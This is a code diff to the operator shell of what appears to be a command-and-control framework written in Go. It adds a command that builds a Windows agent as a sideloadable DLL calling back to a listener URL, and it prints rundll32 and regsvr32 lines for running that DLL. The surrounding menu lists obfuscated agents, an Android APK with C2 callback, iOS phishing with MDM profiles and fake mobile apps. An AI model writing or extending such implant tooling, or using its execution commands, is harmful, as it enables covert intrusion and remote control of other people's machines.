@@ -501,6 +501,7 @@ func (sh *Shell) cmdHelp() {
 		{"Payloads", "📦", [][]string{
 			{"generate exe [url]", "Windows agent (.exe)"},
 			{"generate elf [url]", "Linux agent (ELF)"},
+			{"generate dll [url]", "Windows DLL (sideload/rundll32/regsvr32)"},
 			{"generate android [url]", "Android APK with C2 callback"},
 			{"generate ios [url]", "iOS phishing + MDM profile"},
 			{"generate app <template>", "Fake mobile app (30+ templates)"},
@@ -844,6 +845,7 @@ func (sh *Shell) cmdGenerate(args []string) {
 	fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, "generate elf [listener_url]", colorReset, colorDim, "Linux ELF agent (amd64)", colorReset)
 	fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, "generate exe-garble [listener_url]", colorReset, colorDim, "Obfuscated Windows EXE (garble)", colorReset)
 	fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, "generate elf-garble [listener_url]", colorReset, colorDim, "Obfuscated Linux ELF (garble)", colorReset)
+	fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, "generate dll [listener_url]", colorReset, colorDim, "Windows DLL — sideload, rundll32, regsvr32", colorReset)
 	fmt.Println()
 
 	fmt.Printf("  %sMobile Payloads:%s\n", colorYellow, colorReset)
@@ -884,6 +886,9 @@ func (sh *Shell) cmdGenerate(args []string) {
 		return
 	case "elf-garble":
 		sh.buildAgent("linux", "amd64", listenerURL, true)
+		return
+	case "dll":
+		sh.buildAgentMode("windows", "amd64", listenerURL, "dll", false)
 		return
 	case "android":
 		output, err := payloads.GenerateAndroidPayload(listenerURL, "build/payloads")
@@ -962,14 +967,27 @@ func (sh *Shell) cmdGenerate(args []string) {
 }
 
 func (sh *Shell) buildAgent(targetOS, arch, listenerURL string, obfuscate bool) {
-	Info("Building %s/%s agent...", targetOS, arch)
+	sh.buildAgentMode(targetOS, arch, listenerURL, "", obfuscate)
+}
+
+func (sh *Shell) buildAgentMode(targetOS, arch, listenerURL, buildMode string, obfuscate bool) {
+	label := fmt.Sprintf("%s/%s", targetOS, arch)
+	if buildMode == "dll" {
+		label = fmt.Sprintf("%s/%s DLL", targetOS, arch)
+	}
+	Info("Building %s agent...", label)
 	if obfuscate {
 		Info("Obfuscation: garble (literals + tiny)")
+	}
+	if buildMode == "dll" {
+		Info("Build mode: c-shared — sideloadable Windows DLL")
+		Info("Exports: Start (rundll32), DllInstall (regsvr32 /i), DllRegisterServer (regsvr32)")
 	}
 
 	cfg := agent.BuildConfig{
 		OS:          targetOS,
 		Arch:        arch,
+		BuildMode:   buildMode,
 		ListenerURL: listenerURL,
 		Sleep:       sh.server.Config.Server.DefaultSleep,
 		Jitter:      sh.server.Config.Server.DefaultJitter,
@@ -992,6 +1010,13 @@ func (sh *Shell) buildAgent(targetOS, arch, listenerURL string, obfuscate bool) 
 	fmt.Printf("  %-12s %ds / %d%%\n", "Sleep:", cfg.Sleep, cfg.Jitter)
 	if obfuscate {
 		fmt.Printf("  %-12s %s\n", "Obfuscation:", "garble (literals stripped)")
+	}
+	if buildMode == "dll" {
+		fmt.Println()
+		Info("Execution methods:")
+		fmt.Printf("  %srundll32.exe %s,Start%s\n", colorCyan, result.OutputPath, colorReset)
+		fmt.Printf("  %sregsvr32 /s /i %s%s\n", colorCyan, result.OutputPath, colorReset)
+		fmt.Printf("  %sregsvr32 /s %s%s\n", colorCyan, result.OutputPath, colorReset)
 	}
 	fmt.Println()
 }
